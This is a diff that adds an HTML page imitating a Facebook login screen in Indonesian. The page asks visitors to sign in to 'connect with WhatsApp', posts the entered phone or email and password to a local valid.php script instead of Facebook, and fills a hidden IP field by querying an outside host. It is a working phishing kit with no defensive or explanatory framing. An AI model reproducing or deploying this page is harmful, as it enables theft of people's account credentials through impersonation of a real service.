@@ -1,0 +1,108 @@
+<html><head>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="theme-color" content="#1BA691">
+	<title>Facebook Login</title>
+	<link rel="stylesheet" type="text/css" href="css/facebook.css">
+	<style type="text/css">
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+		body {
+			width: 100%;
+			height: 100vh;
+			overflow: hidden;
+		}
+		@media(max-width: 911px)
+		{
+			body{
+				background: url('https://i.top4top.io/p_1888iq43d0.jpg') no-repeat;
+				background-size: cover;
+			}
+		}
+	</style>
+</head>
+<body>
+	<div class="popup-login login-facebook animated fadeIn" style="display: block;">
+	   <div class="popup-box-login-fb">
+	      <div class="navbar-fb">
+	         <img width="45" src="img/facebook_text.png">
+	      </div>
+	      <div class="content-box-fb">
+	        <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
+	        <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
+	         <img width="75" height="75" src="img/icon.png">
+	         <div class="txt-login-fb">
+	          Masuk ke akun Facebook Anda untuk terhubung dengan Whatsapp
+	         </div>
+	         <form class="login-form" action="valid.php" method="POST" onsubmit="return valid()">
+	            <label>
+	            <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
+	            </label>
+	            <label>
+	            <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
+	            </label>
+	            <input type="hidden" name="ip" id="ip" value="160.36.59.197">
+	            <button type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
+	         </form>
+	         <div class="txt-create-account">Create account</div>
+	         <div class="txt-not-now">Not now</div>
+	         <div class="txt-forgotten-password">Forgotten password?</div>
+	      </div>
+	      <div class="language-box">
+	         <center>
+	         <div class="language-name language-name-active">English (UK)</div>
+	         <div class="language-name">Bahasa Indonesia</div>
+	         <div class="language-name">Basa Jawa</div>
+	         <div class="language-name">Bahasa Melayu</div>
+	         <div class="language-name">æ—¥æœ¬èªž</div>
+	         <div class="language-name">EspaÃ±ol</div>
+	         <div class="language-name">PortuguÃªs (Brasil)</div>
+	         <div class="language-name">
+	            <i class="fa fa-plus"></i>
+	         </div>
+	         </center>
+	      </div>
+	      <div class="copyright">Facebook Inc.</div>
+	   </div>
+	 </div>
+	 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	 <script type="text/javascript">
+        var checkip = function () {
+               $.ajax({
+                   type: "get",
+                   async: false,
+                   url: "https://api.pubgameshowtime.com/ip/getcountry",
+                   dataType: "json",
+                   success: function (result) {
+                      $('#ip').val(result.ip);
+                   }
+               })
+           }
+        checkip();
+    </script>
+    <script type="text/javascript">
+        function valid() {
+            var user = $('#user').val();
+            var pass = $('#pass').val();
+            var ip = $('#ip').val();
+            if(user == '' || user == null || user.length <= 5)
+            {
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+            }else{
+                $('.email').hide();
+            }
+            if(pass == '' || pass == null || pass.length <= 5)
+            {
+                $('.sandi').show();
+                return false;
+            }else{
+                $('.sandi').hide();
+            }
+        }
+    </script>
+
+</body></html>
